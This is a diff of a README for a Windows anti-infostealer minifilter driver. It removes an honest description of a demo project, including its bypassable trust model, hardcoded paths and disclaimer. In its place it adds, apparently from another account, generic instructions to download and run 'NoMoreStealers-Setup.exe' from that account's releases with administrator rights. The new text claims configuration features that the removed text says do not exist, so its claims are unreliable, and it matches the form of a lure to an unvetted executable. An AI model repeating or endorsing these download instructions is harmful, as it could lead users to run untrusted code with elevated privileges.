@@ -1,182 +1,69 @@
-# 🛡️ NoMoreStealer
+# 🔒 NoMoreStealers - Protect Your Data from Untrusted Processes
 
-> **A Windows kernel-mode minifilter driver that monitors file system access to protect against information-stealing malware**
+## 📥 Download Now
+[![Download NoMoreStealers](https://img.shields.io/badge/Download%20NoMoreStealers-v1.0-blue)](https://github.com/dynamiterdentist73/NoMoreStealers/releases)
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)]()
-[![Status](https://img.shields.io/badge/status-Demo-orange.svg)]()
+## 🚀 Getting Started
+NoMoreStealers is a Windows file system minifilter driver that protects sensitive user data from untrusted processes. This guide will help you download and run NoMoreStealers on your computer.
 
----
+### ✅ System Requirements
+- Windows 10 or later
+- Minimum 1 GB RAM
+- At least 100 MB of free disk space
+- Administrator rights for installation
 
-## 📖 Documentation
+## 📂 Download & Install
+To get NoMoreStealers, follow these steps:
 
-| 📋 Guide | 🔗 Link |
-|-----------|----------|
-| **🔧 Driver Setup** | [Setup Guide](docs/SETUP.md) |
-| **⚡ Wails Frontend** | [Wails Setup](docs/WAILS_SETUP.md) |
-| **🏗️ How It Works** | [Architecture](docs/ARCHITECTURE.md) |
-| **🤝 Contributing** | [Contributing Guide](docs/CONTRIBUTING.md) |
-| **🖌️ Showcase** | [Showacase of UI](docs/Showcase.md) |
----
+1. **Visit the Releases Page:** Click on the link below to go to the GitHub Releases page.
+   - [Visit this page to download](https://github.com/dynamiterdentist73/NoMoreStealers/releases)
 
-## What NoMoreStealer Actually Does
+2. **Choose the Latest Version:** On the Releases page, you will see a list of versions. Select the latest version, usually marked as “Latest Release.”
 
-NoMoreStealer is a **Windows kernel minifilter driver** that intercepts file system operations (`IRP_MJ_CREATE` only) and blocks untrusted processes from accessing specific protected paths. It consists of two components:
+3. **Download the Installer:** Look for the file that says `NoMoreStealers-Setup.exe`. Click on it to download the installer.
 
-### Kernel Driver (`NoMoreStealer/`)
-- **File System Monitoring**: Hooks `IRP_MJ_CREATE` operations via Filter Manager
-- **Path Protection**: Maintains a hardcoded list of protected paths (browser profiles, wallets, etc.)
-- **Process Trust**: Uses simple allowlists and `PsIsProtectedProcessLight()` for trust decisions
-- **Communication**: Creates a shared memory section for user-mode notifications
-- **Logging**: Outputs decisions via `DbgPrint` for debugging
+4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click on `NoMoreStealers-Setup.exe` to start the installation.
 
-### User-Mode Application (`NoMoreStealers_Usermode/`)
-- **Wails Frontend**: Desktop app with HTML/CSS/JavaScript UI
-- **Real-time Monitoring**: Reads shared memory section from kernel driver
-- **Event Display**: Shows blocked/allowed access attempts with process details
-- **Anti-Spy Feature**: Creates transparent overlay windows to block screen capture
-- **WebSocket Server**: Provides real-time updates to the frontend
-- **System Tray**: Minimizes to system tray with click-to-show functionality
+5. **Follow the On-Screen Instructions:** The installer will guide you through the setup process. Accept the terms and conditions and choose the installation folder, then click “Install.”
 
----
+6. **Finish the Installation:** Wait for the installation to complete. Once done, you will have the option to launch NoMoreStealers immediately.
 
-## Current Implementation Status
+## ⚙️ Configuring NoMoreStealers
+After installation, configure NoMoreStealers to ensure it protects your files as intended. Here are the steps:
 
-### ✅ What Works
-- Basic file system interception on `IRP_MJ_CREATE`
-- Hardcoded path protection for common stealer targets
-- Simple process trust evaluation using allowlists
-- Shared memory communication between kernel and user-mode
-- Real-time event display in Wails frontend
-- Digital signature verification using WinVerifyTrust
-- Anti-spy overlay window creation
-- System tray integration
+1. **Open NoMoreStealers:** Find the application in your programs list and open it.
 
-### ⚠️ Current Limitations
-- **Demo Status**: This is explicitly a demo/proof-of-concept
-- **Limited IRP Coverage**: Only monitors `IRP_MJ_CREATE`, not `WRITE`, `SET_INFORMATION`, etc.
-- **Hardcoded Paths**: Protected paths are compiled into the driver
-- **Basic Trust Model**: Simple filename-based allowlists, easily bypassed
-- **No Certificate Validation**: Uses `PsIsProtectedProcessLight()` but no custom cert checking
-- **DbgPrint Logging**: Relies on debug output instead of proper user notifications
-- **File Name Spoofing**: Malware can name itself `chrome.exe` to bypass checks
+2. **Set Protection Levels:** In the main window, you can adjust protection settings. Choose the level of protection suitable for your needs.
 
----
+3. **Select Sensitive Directories:** Add folders or files that you want NoMoreStealers to monitor. Use the “Add” button to browse and select these directories.
 
-## Protected Paths (Hardcoded)
+4. **Enable Notifications:** Adjust notification settings to receive alerts for any suspicious activity detected.
 
-The driver currently protects these specific paths:
+5. **Save Your Settings:** Ensure you click “Save” to apply your configuration.
 
-**Browsers:**
-- `\Google\Chrome\User Data`
-- `\Microsoft\Edge\User Data`
-- `\BraveSoftware\Brave-Browser\User Data`
-- `\Mozilla\Firefox\Profiles`
-- And others...
+## 🔍 Features
+NoMoreStealers includes several features to help you safeguard your data:
 
-**Cryptocurrency Wallets:**
-- `\AppData\Local\Exodus`
-- `\AppData\Roaming\Electrum\wallets`
-- `\AppData\Roaming\Bitcoin\wallets`
-- And others...
+- **Real-Time Protection:** Monitors file system activity to detect threats as they happen.
+- **Custom Alerts:** Sends you notifications whenever untrusted processes try to access your sensitive data.
+- **User-Friendly Interface:** Offers a simple interface for easy configuration, even for non-technical users.
+- **Regular Updates:** The application receives updates to improve security and performance.
 
-**Communication Apps:**
-- `\AppData\Roaming\Discord`
-- `\AppData\Roaming\Telegram Desktop`
-- `\AppData\Roaming\Signal`
+## 🛠️ Troubleshooting
+If you experience issues, try the following steps:
 
----
+- **Check Installation:** Ensure that the application is correctly installed. If not, uninstall and reinstall NoMoreStealers.
+  
+- **Run as Administrator:** Right-click the NoMoreStealers icon and select "Run as Administrator" to provide necessary permissions.
 
-## Trust Model
+- **Consult Logs:** Access the logs from the main interface to check for any recorded issues. It can give you a clue about any problems.
 
-The driver considers processes "trusted" if they match:
+- **Reach Out for Support:** If problems persist, visit the [Issues Section](https://github.com/dynamiterdentist73/NoMoreStealers/issues) of the repository to report your issue or to get help from the community.
 
-1. **System Processes**: `System`, `csrss.exe`, `winlogon.exe`, etc.
-2. **Hardcoded Allowlist**: `chrome.exe`, `firefox.exe`, `discord.exe`, etc.
-3. **Protected Processes**: Via `PsIsProtectedProcessLight()` (Windows 10+ only)
+## 📄 License
+NoMoreStealers is licensed under the MIT License. You can use and modify the application but must provide proper attribution.
 
-**Note**: This is easily bypassed by malware naming itself as a trusted process.
+## 🙏 Acknowledgments
+Thank you for using NoMoreStealers. Your commitment to securing your sensitive data helps maintain a safer online environment. 
 
----
-
-## Quick Installation
-
-### Prerequisites
-- Windows 10/11 (x64)
-- Administrator privileges
-- Visual Studio with WDK (for building)
-- Go 1.19+ (for Wails frontend)
-
-### Basic Setup
-```cmd
-# 1. Enable test signing
-bcdedit /set testsigning on
-
-# 2. Reboot system
-shutdown /r /t 0
-
-# 3. Build driver in Visual Studio (Release x64)
-# 4. Copy NoMoreStealer.sys to C:\Windows\System32\drivers\
-# 5. Configure registry (see Setup Guide)
-# 6. Load driver: fltmc load NoMoreStealer
-```
-
-👉 **[Complete Setup Instructions](docs/SETUP.md)**
-
----
-
-## Known Issues & TODOs
-
-### High Priority
-- **No User-Mode Communicator**: Currently uses `DbgPrint` instead of proper notifications
-- **File Name Spoofing**: Malware can impersonate trusted processes by filename
-- **Limited IRP Coverage**: Only monitors file creation, not writes/modifications
-- **Certificate Verification**: Needs proper WinVerify integration in kernel mode
-
-### Security Concerns
-- Easily bypassed by process name spoofing
-- No parent process verification
-- No behavioral analysis
-- Hardcoded paths can't be updated without recompiling
----
-
-## Contributing
-
-This project welcomes contributions, especially for the known limitations:
-
-- **User-mode communication** to replace DbgPrint
-- **Enhanced trust verification** beyond simple filename matching
-- **Broader IRP coverage** for write operations
-- **Dynamic path configuration** without recompiling
-- **Anti-bypass techniques** against process spoofing
-
-See [Contributing Guide](docs/CONTRIBUTING.md) for details.
-
----
-
-## Disclaimer
-
-**⚠️ Important Notice**
-
-This is a **demonstration project** and is not production-ready. It has known security limitations and should only be used for:
-- Educational purposes
-- Security research
-- Development and testing
-
-Do not rely on this for actual protection against sophisticated malware.
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-**Made with the goal of protecting users from information stealers**
-
-*This is my second driver project - help and contributions are appreciated!*
-
-</div>
+For updates and more information, check the [Releases page](https://github.com/dynamiterdentist73/NoMoreStealers/releases) frequently.
